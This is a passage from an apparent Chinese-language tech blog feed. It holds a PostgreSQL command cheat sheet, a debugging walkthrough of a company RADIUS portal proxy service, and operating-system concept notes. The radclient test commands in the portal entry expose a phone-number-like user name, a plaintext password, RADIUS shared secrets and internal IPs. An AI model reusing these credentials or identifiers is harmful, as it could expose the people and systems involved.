&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，关于两者算法的思想就讲解完毕了，感谢大家的观看！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近因为在准备东西的时候发现自己还有很多不足，一直在学习操作系统的有关东西，加上也在熟悉公司业务，算法也有在做，但是写算法的题解耗时非常久，因为要写分析和画图，今天分享一道常规的链表题目：&lt;a href=&quot;https://leetcode-cn.com/problems/h</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://example.com/categories/Algorithm/"/>
    
    
    <category term="Algorithm" scheme="http://example.com/tags/Algorithm/"/>
    
    <category term="链表" scheme="http://example.com/tags/%E9%93%BE%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>Postgresql常用命令</title>
    <link href="http://example.com/2022/03/21/utils/Postgresql%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2022/03/21/utils/Postgresql%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2022-03-21T13:09:07.000Z</published>
    <updated>2022-03-21T13:10:03.404Z</updated>
    
    <content type="html"><![CDATA[<h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><figure class="highlight n1ql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> dbuser <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">PASSWORD</span> <span class="hljs-string">&#x27;password&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="查看所有用户"><a href="#查看所有用户" class="headerlink" title="查看所有用户"></a>查看所有用户</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">postgres=<span class="hljs-comment"># \du</span><br></code></pre></td></tr></table></figure><h2 id="更改密码"><a href="#更改密码" class="headerlink" title="更改密码"></a>更改密码</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">postgres=<span class="hljs-comment"># \password dbuser</span><br>postgres=<span class="hljs-comment"># \q</span><br></code></pre></td></tr></table></figure><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">postgres=# <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> exampledb <span class="hljs-keyword">OWNER</span> dbuser;<br>postgres=# <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">DATABASE</span> exampledb <span class="hljs-keyword">to</span> dbuser;<br>postgres=# \c exampledb;<br>postgres=# <span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">SCHEMA</span> <span class="hljs-built_in">public</span> <span class="hljs-keyword">OWNER</span> <span class="hljs-keyword">to</span> dbuser;<br>postgres=# <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SEQUENCES</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">SCHEMA</span> <span class="hljs-built_in">public</span> <span class="hljs-keyword">TO</span> dbuser;<br>postgres=# <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">SCHEMA</span> <span class="hljs-built_in">public</span> <span class="hljs-keyword">TO</span> dbuser;<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo -u postgres createdb -O dbuser exampledb</span><br></code></pre></td></tr></table></figure><h2 id="查看所有数据库"><a href="#查看所有数据库" class="headerlink" title="查看所有数据库"></a>查看所有数据库</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">postgres=<span class="hljs-comment"># \l</span><br></code></pre></td></tr></table></figure><h2 id="切换数据库"><a href="#切换数据库" class="headerlink" title="切换数据库"></a>切换数据库</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">postgres=<span class="hljs-comment"># \c exampledb</span><br></code></pre></td></tr></table></figure><h2 id="查看表"><a href="#查看表" class="headerlink" title="查看表"></a>查看表</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">postgres=<span class="hljs-comment"># \d</span><br></code></pre></td></tr></table></figure><p>查看表结构</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">postgres=<span class="hljs-comment"># \d user_tab1</span><br></code></pre></td></tr></table></figure><h2 id="常用控制台命令"><a href="#常用控制台命令" class="headerlink" title="常用控制台命令"></a>常用控制台命令</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\password</span>           设置密码。<br><span class="hljs-string">\q</span>                  退出。<br><span class="hljs-string">\h</span>                  查看SQL命令的解释，比如<span class="hljs-string">\h</span> select。<br><span class="hljs-string">\?</span>                  查看psql命令列表。<br><span class="hljs-string">\l</span>                  列出所有数据库。<br><span class="hljs-string">\c</span> [database_name]  连接其他数据库。<br><span class="hljs-string">\d</span>                  列出当前数据库的所有表格。<br><span class="hljs-string">\d</span> [table_name]     列出某一张表格的结构。<br><span class="hljs-string">\du</span>                 列出所有用户。<br><span class="hljs-string">\e</span>                  打开文本编辑器。<br><span class="hljs-string">\conninfo</span>           列出当前数据库和连接的信息。<br></code></pre></td></tr></table></figure><h2 id="基本的-SQL-语句"><a href="#基本的-SQL-语句" class="headerlink" title="基本的 SQL 语句"></a>基本的 SQL 语句</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 创建新表<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> user_tbl(<span class="hljs-type">name</span> <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>), signup_date <span class="hljs-type">DATE</span>);<br><br># 插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> user_tbl(<span class="hljs-type">name</span>, signup_date) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-string">&#x27;2013-12-22&#x27;</span>);<br><br># 查询记录<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> user_tbl;<br><br># 更新数据<br><span class="hljs-keyword">UPDATE</span> user_tbl <span class="hljs-keyword">set</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;李四&#x27;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><br># 删除记录<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> user_tbl <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;李四&#x27;</span> ;<br><br># 添加字段<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">ADD</span> email <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">40</span>);<br><br># 更改字段类型<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">COLUMN</span> signup_date <span class="hljs-keyword">SET</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>;<br><br># 设置字段默认值（注意字符串使用单引号）<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">COLUMN</span> email <span class="hljs-keyword">SET</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;example@example.com&#x27;</span>;<br><br># 去除字段默认值<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">ALTER</span> email <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">DEFAULT</span>;<br><br># 重命名字段<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">COLUMN</span> signup_date <span class="hljs-keyword">TO</span> signup;<br><br># 删除字段<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">COLUMN</span> email;<br><br># 表重命名<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TO</span> backup_tbl;<br><br># 删除表<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span> backup_tbl;<br><br># 删除库<br>\c hello2;<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">DATABASE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span> hello;<br></code></pre></td></tr></table></figure><p>从上面的命令可以看出基本的 SQL 语句跟 MySQL 是一样的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;创建用户&quot;&gt;&lt;a href=&quot;#创建用户&quot; class=&quot;headerlink&quot; title=&quot;创建用户&quot;&gt;&lt;/a&gt;创建用户&lt;/h2&gt;&lt;figure class=&quot;highlight n1ql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;div</summary>
      
    
    
    
    <category term="utils" scheme="http://example.com/categories/utils/"/>
    
    
    <category term="SQL" scheme="http://example.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Portal代拨控制流程</title>
    <link href="http://example.com/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/"/>
    <id>http://example.com/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/</id>
    <published>2022-03-21T08:03:59.000Z</published>
    <updated>2022-03-21T08:05:35.541Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Portal-代拨控制流程"><a href="#Portal-代拨控制流程" class="headerlink" title="Portal 代拨控制流程"></a>Portal 代拨控制流程</h2><h3 id="ACCOUNTING-REQUEST"><a href="#ACCOUNTING-REQUEST" class="headerlink" title="ACCOUNTING_REQUEST"></a>ACCOUNTING_REQUEST</h3><p>首先在Linux向portal发送一个包,这里的IP不同命令略有不同，但都大差不差</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">echo -e &#x27;Acct-Status-Type = &#x27;Start&#x27;\nUser-Name = &quot;15291416563&quot;\nFramed-IP-Address = &#x27;192.168.48.20&#x27;\nNAS-IP-Address = &quot;192.168.0.190&quot;\nAcct-Session-Id = &#x27;00000007202011011620040020d11d00101541&#x27;\nCalling-Station-Id=&#x27;dc-31-d1-4d-8f-8d&#x27; &#x27; | ./radclient -x 10.93.101.196 acct aaa<br></code></pre></td></tr></table></figure><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321135927451.png" class><p>我在这里打了一个断点，</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321140128764.png" class><p>可以看到方法要进入handleAccountRequest</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321140356314.png" class><p>接下来proxyExecutor调用handleAccountingRequest方法去处理请求</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321140659221.png" class><p>这是请求处理的过程。</p><p>它首先去获取用户状态，如果状态是开始状态，那就不去处理，如果是结束，那就会调用handleDisconnectRequest方法去结束计费</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321141203832.png" class><p>这是大概过程，我都进行了标记</p><p>当handleAccountingRequest方法完成以后，就把response进行参数包装，设置为Code.ACCOUNTING_RESPONSE状态进行标记，Code是个枚举值，里面有很多状态，表示这个请求的类型</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321141451228.png" class><h3 id="ACCESS-REQUEST"><a href="#ACCESS-REQUEST" class="headerlink" title="ACCESS_REQUEST"></a>ACCESS_REQUEST</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo -e &#x27;User-Name = &quot;user02&quot;\nUser-Password = &quot;IoBg5Z&quot;\nFramed-IP-Address = &#x27;192.168.48.20&#x27;\nCalling-Station-Id = &#x27;60F677024072&#x27;&#x27; | ./radclient -x 10.93.101.196 auth aa<br></code></pre></td></tr></table></figure><p>接下来发送一个ACCESS_REQUEST请求</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321142509558.png" class><p>如图断点停在了这里和刚才一样，同一个proxyExecutor的handleAccessRequest来对它进行处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 验证使用权请求</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> String <span class="hljs-title function_">handleAccessRequest</span><span class="hljs-params">(RadiusRequest request)</span>&#123;<br>        <span class="hljs-comment">// 把接收到的参数全部保留到attrs</span><br>        List&lt;Attribute&gt; attrs = request.getAttributes();<br>        <span class="hljs-comment">// 提取用户名</span><br>        <span class="hljs-type">var</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> Attributes.getAttributeValueAsString(attrs, AttributeType.USER_NAME);<br>        <span class="hljs-type">var</span> <span class="hljs-variable">framedIpAddress</span> <span class="hljs-operator">=</span>  Attributes.getInet4Address(Attributes.getFirst(attrs, AttributeType.FRAMED_IP_ADDRESS)).getHostAddress();<br>        logger.info(<span class="hljs-string">&quot;收到认证请求，开始进行绑定 ---&gt; [&#123;&#125;]&quot;</span>, OffsetDateTime.now());<br>        <span class="hljs-keyword">try</span>&#123;<br>            handleDisconnectRequest(request);<br>            <span class="hljs-comment">// 先去找到一个可用session，相当于new，但过程较为繁琐</span><br>            <span class="hljs-type">var</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> onlineSessionService.findOneAvailableSession();<br>            logger.info(<span class="hljs-string">&quot;find one available session = [&#123;&#125;] ---&gt; [&#123;&#125;]&quot;</span>, session, OffsetDateTime.now());<br>            <span class="hljs-comment">// 如果session可用</span><br>            <span class="hljs-keyword">if</span> (StringUtils.hasText(session.getExternalIp()))&#123;<br>                <span class="hljs-comment">// 添加用户内网IP绑定关系成功</span><br>                <span class="hljs-keyword">if</span> (Boolean.TRUE.equals(<br>                    vppRepository.addIpMappings(framedIpAddress, session.getExternalIp()))) &#123;<br>                    <span class="hljs-comment">// 给session绑定数据</span><br>                    session.setEnable(<span class="hljs-literal">true</span>);<br>                    session.setWenetAccount(username);<br>                    session.setInneralIp(framedIpAddress);<br>                    session.setUpdateAt(OffsetDateTime.now());<br>                    <span class="hljs-comment">// 存储用户session</span><br>                    onlineSessionRepository.save(session);<br>                    logger.info(<span class="hljs-string">&quot;用户上线成功, session = [&#123;&#125;] ---&gt; [&#123;&#125;]&quot;</span>, session, OffsetDateTime.now());<br>                    <span class="hljs-keyword">return</span> PROXY_SUCCESS;<br>                &#125;<span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// 绑定失败</span><br>                    session.setEnable(<span class="hljs-literal">false</span>);<br>                    onlineSessionRepository.save(session);<br>                    logger.info(<span class="hljs-string">&quot;vpp nat 绑定失败 ----&gt; [&#123;&#125;]&quot;</span>, OffsetDateTime.now());<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                logger.info(<span class="hljs-string">&quot;Online session 无可用会话 ---&gt; [&#123;&#125;]&quot;</span>, OffsetDateTime.now());<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> PROXY_FAILURE;<br>        &#125;<br>        <span class="hljs-keyword">return</span> PROXY_FAILURE;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这是处理过程，我都加了相应的注释</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321143001394.png" class><p>当对请求处理完成以后会对response进行包装就结束了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Portal-代拨控制流程&quot;&gt;&lt;a href=&quot;#Portal-代拨控制流程&quot; class=&quot;headerlink&quot; title=&quot;Portal 代拨控制流程&quot;&gt;&lt;/a&gt;Portal 代拨控制流程&lt;/h2&gt;&lt;h3 id=&quot;ACCOUNTING-REQUEST&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>操作系统概念</title>
    <link href="http://example.com/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/"/>
    <id>http://example.com/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/</id>
    <published>2022-03-20T11:42:07.000Z</published>
    <updated>2022-03-21T08:03:57.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="操作系统概念"><a href="#操作系统概念" class="headerlink" title="操作系统概念"></a>操作系统概念</h1><h3 id="操作系统的功能与目标"><a href="#操作系统的功能与目标" class="headerlink" title="操作系统的功能与目标"></a>操作系统的功能与目标</h3><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220318093513660.png" class><p>操作系统作为一个系统资源的管理者，它主要包含</p><p><strong>处理器管理</strong></p><p><strong>存储器管理</strong></p><p><strong>设备管理</strong></p><p><strong>文件管理</strong></p><p><strong>用户接口</strong> </p><p><strong>网络与通信管理</strong> </p><p>以上六个部分</p><h3 id="操作系统基本特征"><a href="#操作系统基本特征" class="headerlink" title="操作系统基本特征"></a>操作系统基本特征</h3><p><strong>并发性：指两个或两个以上的事件或活动在同一时间间隔内发生 。并发性能够有效地改善系统资源的利用率，提高系统的效率。</strong> </p><p><strong>共享性：共同使用系统中的资源。</strong></p><p> （1）互斥使用方式（2）同时使用方式</p><p><strong>虚拟性：指将一个物理实体映射为多个逻辑实体。</strong> </p><p><strong>不确定性：程序运行次序的不确定性，程序多次运行所花费时间的不确定性</strong></p><p>总结下来就是并发、共享、虚拟、异步</p><h3 id="并发与并行"><a href="#并发与并行" class="headerlink" title="并发与并行"></a>并发与并行</h3><p>并发：指两个或多个事件在同一时间间隔内发生。这些事件在宏观上是同时发生的，但在微观上是交替发生的</p><p>并行：指多个事件在同一时刻内发生</p><p>比如说一个人要同时和两个人约会，但是现在有不同的约会方法</p><p>并行：同一时刻同时和一号二号一起约会</p><p>并发：宏观上看起来一天和两个人约会，但是它第一个小时和一号女友约会，第二个小时和二号女友约会，第三个小时又和一号女友约会，如此往复。在微观上看：他每个时刻只和一个人约会</p><p>操作系统的并发性指计算机系统中同时存在着多个运行的程序</p><h3 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h3><p>共享即资源共享，是指系统中的资源可供内存中多个并发执行的进程共同使用</p><p>一共有两者资源共享方式：互斥共享和同时共享</p><ul><li>互斥共享</li></ul><p>虽然可以提供给多个进程使用，但<strong>一个时间段只允许一个进程访问该资源</strong></p><p>比如视频聊天在同一时刻，摄像头只能给一个app</p><ul><li>同时共享</li></ul><p>系统中某些资源，允许一个时间段内由多个进程同时对它们进行访问，这里的“同时”在微观上可能是交替对资源进行访问的</p><p>使用QQ发送文件A，微信发送文件B。宏观上看，两边都在同时读取和发送文件，这说明两个进程都在访问硬盘资源，在微观上看，两个进程是在交替访问的 </p><h3 id="处理器状态"><a href="#处理器状态" class="headerlink" title="处理器状态"></a>处理器状态</h3><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220320183708220.png" class><p>我们知道：有的用户输入的指令CPU是不可以去执行的，因为它可能操作了某些重要的内存，那CPU如何只能指令能不能执行？</p><p>处理器状态分为用户态（目态）和核心态（管态），管态可以执行任何指令，目态只能执行非特权指令</p><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220320184206096.png" class><h3 id="中断和异常"><a href="#中断和异常" class="headerlink" title="中断和异常"></a>中断和异常</h3><p>我们知道如果操作系统同一时刻只能执行一个任务，那它的利用率就会特别低，那如何实现并发执行呢？</p><p>CPU同一时刻只能执行一个任务，那当一个任务用了一定时间片以后，就让操作系统给CPU发出<strong>中断信号</strong>，切换为<strong>核心态</strong>，对中断进行处理</p><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220320190323326.png" class><ol><li>中断发生时，CPU立刻进入核心态</li><li>中断发生时，当前进程暂停运行，由操作系统内核对中断进行处理</li><li>对于不同的中断信号，会进行不同的处理</li></ol><p>用户态到核心态的变化是通过<strong>中断</strong>来实现的，且中断是<strong>唯一</strong>途径。核心态到用户态是通过执行一个特权指令，将程序状态字（PSW）的标志位设置为“用户态”。</p><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>操作系统作为用户和计算机硬件之间的接口要向上面提供一些简单易用的服务。包括命令接口和程序接口，其中程序接口由一组<strong>系统调用</strong>组成。</p><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220320192458386.png" class><p>系统调用是操作系统给程序员使用的接口，是一种特殊的函数。系统中各种共享资源都由操作系统统一掌管，凡是与资源有关的操作，都必须通过系统调用的方式向操作系统发出请求，由操作系统<strong>代为完成</strong>，这样就可以保证系统稳定性。</p><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220320193135322.png" class><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220320193450621.png" class><p>至此有关操作系统的前置东西大概讲了讲，后面会进行每个部分的具体讲解</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;操作系统概念&quot;&gt;&lt;a href=&quot;#操作系统概念&quot; class=&quot;headerlink&quot; title=&quot;操作系统概念&quot;&gt;&lt;/a&gt;操作系统概念&lt;/h1&gt;&lt;h3 id=&quot;操作系统的功能与目标&quot;&gt;&lt;a href=&quot;#操作系统的功能与目标&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="操作系统" scheme="http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>SpringAOP</title>
    <link href="http://example.com/2022/03/19/Spring/SpringAOP/"/>
    <id>http://example.com/2022/03/19/Spring/SpringAOP/</id>
    <published>2022-03-19T15:54:40.000Z</published>
    <updated>2022-03-19T16:07:50.896Z</updated>
    
